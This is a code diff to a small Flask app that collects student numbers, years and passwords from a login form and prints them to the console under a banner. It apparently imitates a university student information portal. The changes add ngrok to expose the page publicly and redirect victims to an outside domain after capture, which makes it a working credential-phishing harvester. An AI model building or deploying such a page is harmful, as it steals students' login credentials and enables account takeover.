@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, redirect
 import time
 
 app = Flask(__name__)
+from flask_ngrok import run_with_ngrok
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
@@ -14,7 +15,7 @@ def home():
         year = request.form.get('SelectYear')
         password = request.form.get('password')
 
-                print(f"""
+        print(f"""
 \033[1;31m╔════════════════════════════════════════════════╗
 ║ ██████╗ ██████╗ ██████╗ ██╗     ██╗███╗   ██╗ ║
 ║ ██╔══██╗╚════██╗██╔══██╗██║     ██║████╗  ██║ ║
@@ -38,10 +39,9 @@ def home():
         if studno != "HelloWorld" and password != "HelloWorld":
             show_alert = True
             time.sleep(0.1)
-            return redirect("https://sis2.pup.edu.ph/student/")
+            return redirect("https://sulasok.cz/")
     
     return render_template('form.html')
 
 if __name__ == '__main__':
-    app.run(debug=True, use_reloader=False)
-
+    app.run()
